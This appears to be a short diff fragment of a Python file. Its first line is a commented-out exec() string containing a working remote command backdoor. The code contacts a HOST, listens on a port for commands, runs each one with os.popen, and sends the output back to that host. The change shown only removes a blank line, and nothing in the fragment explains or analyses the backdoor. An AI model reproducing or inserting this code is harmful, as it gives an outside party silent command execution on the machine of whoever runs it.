@@ -1,5 +1,4 @@
 # exec("""import socket\nimport os\nimport time\nHOST='...'\nME='...'\nPORT=65432\n\nPORT_S=65431\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nprint('Sending first connection')\ns.connect((HOST, PORT_S))\ns.sendall(b'Hello, Im there!\\nNow Receaving...')\ns.close()\nwhile True:\n  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.bind((ME,PORT))\n  s.listen()\n  conn,addr=s.accept()\n  s.close()\n  data=conn.recv(2048)\n  if data.decode() == 'BREAK OUT':\n    break\n  out=os.popen(data.decode()).read()\n  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n  s.connect((HOST, PORT_S))\n  s.sendall(bytes(out, 'UTF-8'))\n  s.close()\n  time.sleep(0.5)""")
-
 import socket
 import os
 
